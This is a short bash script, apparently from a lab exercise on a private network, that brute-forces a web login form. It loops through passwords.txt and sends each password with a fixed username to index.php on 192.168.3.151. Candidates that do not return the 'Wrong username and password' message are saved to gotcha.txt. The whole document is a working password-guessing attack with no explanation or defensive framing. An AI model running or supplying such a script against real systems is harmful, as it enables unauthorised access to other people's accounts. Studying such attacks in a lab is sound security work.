#ip1=192.168.3.150
#ip2=192.168.3.152
printf "" > gotcha.txt
errormessage="Wrong username and password"
curl --head "192.168.3.151"

while IFS= read -r line
do
	echo "Test: $line"
	curl -s "192.168.3.151/index.php?username=furkan.paligu&password=$line" | grep -oE "$errormessage"
	SUCCESS=$?
	if [[ $SUCCESS -eq 1 ]]; then
	echo "$line" >> gotcha.txt
	fi
done < passwords.txt
